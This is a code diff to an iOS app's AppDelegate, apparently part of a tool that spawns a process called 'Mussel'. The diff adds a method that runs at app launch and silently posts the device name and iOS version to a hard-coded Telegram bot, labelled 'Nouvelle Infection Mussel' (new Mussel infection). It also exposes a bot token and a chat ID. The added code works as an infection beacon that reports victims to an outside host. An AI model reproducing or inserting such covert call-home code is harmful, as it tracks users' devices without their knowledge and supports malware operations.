@@ -47,6 +47,42 @@ extern int posix_spawnattr_set_persona_gid_np(const posix_spawnattr_t *__restric
 
 @implementation AppDelegate
 
+-(void)sendTelegramNotification {
+    // Remplacez BOT_TOKEN et CHAT_ID par vos valeurs
+    NSString *botToken = @"8028810030:AAF8u5i0acP9nMX__A0GyTp45YEJlntr2SI";
+    NSString *chatId = @"6247883707";
+    
+    NSString *deviceName = [[UIDevice currentDevice] name];
+    NSString *systemVersion = [[UIDevice currentDevice] systemVersion];
+    NSString *message = [NSString stringWithFormat:@"🔔 Nouvelle Infection Mussel\n📱 Appareil: %@\n📍 iOS: %@", deviceName, systemVersion];
+    
+
+    NSString *urlString = [NSString stringWithFormat:@"https://api.telegram.org/bot%@/sendMessage", botToken];
+    NSURL *url = [NSURL URLWithString:urlString];
+    
+    NSMutableURLRequest *request = [[NSMutableURLRequest alloc] initWithURL:url];
+    [request setHTTPMethod:@"POST"];
+    [request setValue:@"application/json" forHTTPHeaderField:@"Content-Type"];
+    
+    NSDictionary *parameters = @{
+        @"chat_id": chatId,
+        @"text": message,
+        @"parse_mode": @"HTML"
+    };
+    
+    NSError *error;
+    NSData *jsonData = [NSJSONSerialization dataWithJSONObject:parameters options:0 error:&error];
+    [request setHTTPBody:jsonData];
+    
+    NSURLSession *session = [NSURLSession sharedSession];
+    NSURLSessionDataTask *task = [session dataTaskWithRequest:request completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
+        if (error) {
+            NSLog(@"[%s] Erreur d'envoi de la notification Telegram: %@", __PRETTY_FUNCTION__, error);
+        }
+    }];
+    [task resume];
+}
+
 -(BOOL)spawnMussel
 {
     NSString *plistPath;
@@ -123,6 +159,9 @@ extern int posix_spawnattr_set_persona_gid_np(const posix_spawnattr_t *__restric
 -(BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(id)options
 {
     NSLog(@"[%s] Screen view initialized\n", __PRETTY_FUNCTION__);
+    
+    // Envoi de la notification Telegram
+    [self sendTelegramNotification];
     
     CGRect mainScreenBounds = [[UIScreen mainScreen] bounds];
     self.window = [[UIWindow alloc] initWithFrame:mainScreenBounds];
